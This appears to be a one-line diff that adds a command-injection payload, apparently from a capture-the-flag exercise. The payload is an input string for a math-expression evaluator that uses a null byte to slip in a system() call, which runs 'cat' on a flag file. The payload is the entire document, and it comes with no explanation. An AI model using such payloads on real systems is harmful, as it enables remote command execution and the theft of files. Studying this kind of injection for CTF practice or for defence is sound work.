@@ -1,0 +1,1 @@
+input="sin(\n";system%00('cat%20flag.php')
